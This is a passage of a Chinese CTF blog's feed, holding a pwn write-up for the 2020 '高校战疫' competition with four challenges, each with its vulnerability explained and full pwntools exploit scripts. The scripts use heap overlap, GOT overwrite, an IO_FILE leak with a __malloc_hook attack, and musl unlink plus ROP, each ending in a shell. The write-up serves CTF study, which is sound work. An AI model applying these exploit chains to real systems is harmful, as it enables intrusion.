</div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>iofile利用</title>
    <link href="https://nocbtm.github.io/2020/04/15/iofile%E5%88%A9%E7%94%A8/"/>
    <id>https://nocbtm.github.io/2020/04/15/iofile利用/</id>
    <published>2020-04-15T06:35:24.000Z</published>
    <updated>2020-05-27T09:24:01.123Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>高校战“疫”网络安全分享赛 pwn 复现</title>
    <link href="https://nocbtm.github.io/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-pwn-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://nocbtm.github.io/2020/03/09/高校战“疫”网络安全分享赛-pwn-复现/</id>
    <published>2020-03-09T06:59:08.000Z</published>
    <updated>2020-03-10T07:09:53.648Z</updated>
    
    <content type="html"><![CDATA[<h2 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h2><p>程序没开PIE，got表可写</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>ptr[v1]清零了，但*(void **)ptr[v1]没有清零。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">int sub_4009E4()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  if ( ++dword_6020AC &gt; 4 )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  puts(&quot;What is the index of the item to be deleted?&quot;);</span><br><span class="line">  v1 = sub_400890();</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt; 6 || !ptr[v1] )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  free(*(void **)ptr[v1]);</span><br><span class="line">  free(ptr[v1]);</span><br><span class="line">  ptr[v1] = 0LL;</span><br><span class="line">  return puts(&quot;Delete successfully.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>首先申请俩次堆块都是0x10，然后free掉，看到add函数里是先进行malloc(0x10)，然后在做check，然后再申请check(0x400)，所以由于free之后会残留指针，在free掉俩个堆块之后，故意输入大数字让他check size fail直接返回，然后申请一个0x10的堆块就可以实现堆块重叠。通过edit前俩次的堆块来覆盖最后一次malloc的堆块的ptr指针来指向chunk_list的位置，然后伪造chunk结构指向got，并且show一下就可以知道libc了，然后修改free_got为system然后free一个内容为/bin/sh的堆块就可以开启shell。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">io=process(&apos;./easyheap&apos;)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">io=remote(&apos;121.36.209.145&apos;,9997)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">elf=ELF(&apos;./easyheap&apos;)</span><br><span class="line"></span><br><span class="line">def choice(idx):</span><br><span class="line">    io.sendlineafter(&apos;Your choice:\n&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    choice(1)</span><br><span class="line">    io.sendafter(&apos;this message?\n&apos;, str(size))</span><br><span class="line">    if size&lt; 0x400:</span><br><span class="line">    io.sendafter(&apos;content of the message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">choice(2)</span><br><span class="line">io.sendlineafter(&apos;deleted?\n&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx, content):</span><br><span class="line">    choice(3)</span><br><span class="line">    io.sendlineafter(&apos;modified?\n&apos;,str(idx))</span><br><span class="line">    io.sendafter(&apos;message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line"># ------------------------------------------------</span><br><span class="line">onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line">chunk_list=0x6020C0</span><br><span class="line"># ------------------------------------------------</span><br><span class="line">add(0x18,0x18 * &quot;\x10&quot;) #0</span><br><span class="line">add(0x18,0x18 * &quot;\x11&quot;) #1</span><br><span class="line">dele(0)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line">dele(1)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line"></span><br><span class="line">add(0x18,0x18 * &apos;\x12&apos;) #2</span><br><span class="line">edit(1,p64(0) + p64(0x18) + p64(chunk_list))</span><br><span class="line">edit(2,p64(chunk_list + 8) + p64(chunk_list))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(chunk_list) + p64(chunk_list + 0x18) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;__libc_start_main&apos;]) + p64(chunk_list + 0x30) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;free&apos;]))</span><br><span class="line"></span><br><span class="line">edit(2,p64(elf.plt[&apos;puts&apos;]))</span><br><span class="line">dele(4)</span><br><span class="line">__libc_start_main = u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc = __libc_start_main - lib.symbols[b&apos;__libc_start_main&apos;]</span><br><span class="line">lib.address = libc</span><br><span class="line">system = lib.symbols[&apos;system&apos;]</span><br><span class="line">binsh = lib.search(&quot;/bin/sh\x00&quot;).next()</span><br><span class="line">__dele_hook = lib.symbols[&apos;__free_hook&apos;]</span><br><span class="line">__malloc_hook = lib.symbols[&apos;__malloc_hook&apos;]</span><br><span class="line">__realloc_hook = lib.symbols[&apos;__realloc_hook&apos;]</span><br><span class="line"></span><br><span class="line">edit(5,p64(system))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(binsh))</span><br><span class="line">dele(0)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="woodenbox2"><a href="#woodenbox2" class="headerlink" title="woodenbox2"></a>woodenbox2</h2><p>got表可写，其余保护全开</p><h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>change_item()函数里面没有对size做限制，堆溢出。</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>题目难点在于没有输出功能，需要打io_file泄露libc基址。然后fastbin attack 打malloc_hook,这里onegadget失效，用realloc 调整偏移即可。<br>iofile泄露原理可参考EX师傅博客<a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>成功率 16分之一<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    try:</span><br><span class="line">        if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">        io=process(&apos;./woodenbox2&apos;)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">        else:</span><br><span class="line">        io=remote(&apos;121.36.215.224&apos;,9998)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">        elf=ELF(&apos;./woodenbox2&apos;)</span><br><span class="line"></span><br><span class="line">        def choice(idx):</span><br><span class="line">            io.sendlineafter(&apos;Your choice:&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        def add(size, content):</span><br><span class="line">            choice(1)</span><br><span class="line">            io.sendlineafter(&apos;:&apos;, str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        def free(idx):</span><br><span class="line">        choice(3)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">        def edit(idx,size, content):</span><br><span class="line">            choice(2)</span><br><span class="line">            io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line">            io.sendlineafter(&apos;:&apos;,str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line">        iofile_off = [0x25dd,0xf5eb] #_IO_2_1_stderr_+157</span><br><span class="line">        onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line"></span><br><span class="line">        add(0x20,&apos;aaaa&apos;)#0</span><br><span class="line">        add(0x40,&apos;aaaa&apos;)#1</span><br><span class="line">        add(0x60,&apos;aaaa&apos;)#2</span><br><span class="line">        add(0xa0,&apos;aaaa&apos;)#3</span><br><span class="line"></span><br><span class="line">        edit(0,0x40,&apos;a&apos;*0x20+p64(0)+p64(0xc1))</span><br><span class="line">        free(1) #1</span><br><span class="line">        free(1) #2</span><br><span class="line">        add(0x40,&apos;bbbb&apos;) #0</span><br><span class="line">        edit(0,0x60,&apos;a&apos;*0x40+p64(0)+p64(0x71)+p16(iofile_off[0]))</span><br><span class="line">        add(0x60,&apos;aaaa&apos;) # 2</span><br><span class="line">        add(0x60,&apos;aaa&apos;+p64(0)*6+p64(0xfbad1800)+p64(0)*3+&quot;\x00&quot;) #3</span><br><span class="line">        io.recv(0x40)</span><br><span class="line">        leak=u64(io.recv(8))</span><br><span class="line">        info(hex(leak))</span><br><span class="line">        libc.address = leak-(0x7f35bc64a600-0x7f35bc285000)</span><br><span class="line">        log.success(hex(libc.address))</span><br><span class="line">        malloc_hook = libc.sym[&apos;__malloc_hook&apos;]</span><br><span class="line">        free_hook = libc.sym[&apos;__free_hook&apos;]</span><br><span class="line">        one = libc.address+onegadgets[1]</span><br><span class="line">        log.success(hex(malloc_hook))</span><br><span class="line"></span><br><span class="line">        add(0x60,&apos;cccc&apos;)#4</span><br><span class="line">        add(0x60,&apos;dddd&apos;)#5</span><br><span class="line">        free(5)</span><br><span class="line">        edit(0,0x100,0xa0*&apos;\x17&apos;+p64(0)+p64(0x71)+p64(malloc_hook-0x23))</span><br><span class="line">        add(0x60,&apos;bbbb&apos;)</span><br><span class="line">        add(0x60,&apos;d&apos;*0xb+p64(one)+p64(libc.symbols[&quot;realloc&quot;]+13))</span><br><span class="line">        choice(1)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;, str(60))</span><br><span class="line">        io.interactive()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">io.close()</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure></p><h2 id="bjut"><a href="#bjut" class="headerlink" title="bjut"></a>bjut</h2><p>got表可写，pie没开</p><h3 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>show 和 edit功能，可以输入负数，造成数组上溢。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 edit()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;The index of your hw:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( v1 &lt;= 15 &amp;&amp; qword_404140[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Input your hw:&quot;);</span><br><span class="line">    read(0, qword_404140[v1], dword_4040E0[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;out of range!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>通过数组上溢泄露free_got内容，然后修改 free_got为system，然后释放/bin/sh的堆块</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><h2 id="musl"><a href="#musl" class="headerlink" title="musl"></a>musl</h2><p>做这个题的时候当时是蒙的，使用的是musl libc跟平时的glibc有很大差异。其中最大的差异是muls不支持延迟绑定，没有 malloc_hook等<br>具体参考 <a href="https://my.oschina.net/u/2306127/blog/1592004" target="_blank" rel="noopener">https://my.oschina.net/u/2306127/blog/1592004</a></p><h3 id="漏洞点-3"><a href="#漏洞点-3" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>add功能有一次堆溢出的机会</p><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>溢出修改size然后free造成overlapping<br>free时检查了in_use和下一个chunk的prev_size，提前伪造好prev_size<br>overlapping后再取出来，可以uaf，free chunk的链表头部在libc，uaf之后show泄露libc地址，然后edit把fd和bk改为0x602030，利用双向链表写fd bk的操作把一个堆地址写入0x602040，将heap_store劫持到堆上，实现任意地址读写<br>show和edit的次数有限制，但是可以通过任意地址读写覆盖计数器<br>got plt都不可写，没有hook<br>可以通过任意地址读写改写栈，getshell<br>利用任意地址读，读libc中的environ泄露栈地址，算出栈顶地址，然后利用任意地址写覆盖返回地址</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">r=process([&apos;./libc.so&apos;,&apos;./carbon&apos;])</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line">else:</span><br><span class="line">r=remote(&apos;119.3.158.103&apos;,19008)</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;wdnmd&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def gg_add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;Y\x00&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;2&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;3&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line">    sleep(0.5)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;4&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">heap_store = 0x602030</span><br><span class="line">#add-symbol-file libc.so 0x8000000</span><br><span class="line">#x/64gx 0x82953b0</span><br><span class="line">#x/20gx 0x00007fffff7e0000</span><br><span class="line">add(0x10,&apos;gg&apos;)#0</span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x50,p64(0)*6+p64(0x81)+p64(0xa1))#2</span><br><span class="line">add(0x40,&apos;gg&apos;)#3</span><br><span class="line">add(0x20,&apos;gg&apos;)#4</span><br><span class="line">add(0x20,p64(0x40)+p64(heap_store))#5</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line">gg_add(0x10,&apos;a&apos;*0x10+p64(0x21)+p64(0x81))#0</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x30,&apos;gg&apos;)#2 6</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">show(6)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">info(hex(leak))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">pause()</span><br><span class="line">libc_base = leak-0x292ad8</span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">system = libc_base+libc.sym[&apos;system&apos;]</span><br><span class="line">edit(6,p64(heap_store)*2)</span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">add(0x30,p64(heap_store))#pwn</span><br><span class="line">environ = libc_base+0x294FD8</span><br><span class="line">log.success(hex(environ))</span><br><span class="line"></span><br><span class="line">add(0x60,p64(0x71)+p64(environ)+p64(0x71)+p64(libc_base+0x8295570-0x8000000))# environ 9 </span><br><span class="line">edit(5,p64(0))</span><br><span class="line">show(9)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">stack_rsp = leak-0x118</span><br><span class="line">log.success(hex(stack_rsp))</span><br><span class="line">#gg_stack = 0x7ffffffee638</span><br><span class="line">#print(hex(gg_stack-stack_rsp))</span><br><span class="line">gg_stack = 0xa0+stack_rsp</span><br><span class="line">binsh = libc.search(&apos;/bin/sh\x00&apos;).next()+libc_base</span><br><span class="line">edit(10,p64(0x71)+p64(gg_stack)+&apos;/bin/sh&apos;.ljust(8,&apos;\x00&apos;)+p64(0)+p64(0x41)+p64(binsh))</span><br><span class="line">edit(5,p64(0))</span><br><span class="line">#show(12) test libc_addr</span><br><span class="line">pause()</span><br><span class="line">menu = 0x400c2f</span><br><span class="line">flag = libc_base+0x8295580-0x8000000</span><br><span class="line">pop_rdi_ret = libc_base+0x14862</span><br><span class="line">pop_rsi_ret = libc_base+0x1c237</span><br><span class="line">pop_rdx_ret = libc_base+0x1b92</span><br><span class="line"></span><br><span class="line">puts_addr = libc_base+libc.sym[&apos;puts&apos;]</span><br><span class="line">#edit(10,p64(menu)*10)</span><br><span class="line">edit(10,p64(menu)+p64(pop_rdi_ret)+p64(flag)+p64(system)+p64(menu))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;easyheap&quot;&gt;&lt;a href=&quot;#easyheap&quot; class=&quot;headerlink&quot; title=&quot;easyheap&quot;&gt;&lt;/a&gt;easyheap&lt;/h2&gt;&lt;p&gt;程序没开PIE，got表可写&lt;/p&gt;
&lt;h3 id=&quot;漏洞点&quot;&gt;&lt;a href=&quot;#漏洞点&quot;
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>V&amp;N招新赛writeup</title>
    <link href="https://nocbtm.github.io/2020/03/02/V&amp;N%E6%8B%9B%E6%96%B0%E8%B5%9Bwriteup/"/>
    <id>https://nocbtm.github.io/2020/03/02/V&amp;N招新赛writeup/</id>
    <published>2020-03-02T08:47:00.000Z</published>
    <updated>2020-04-23T04:00:50.792Z</updated>
    
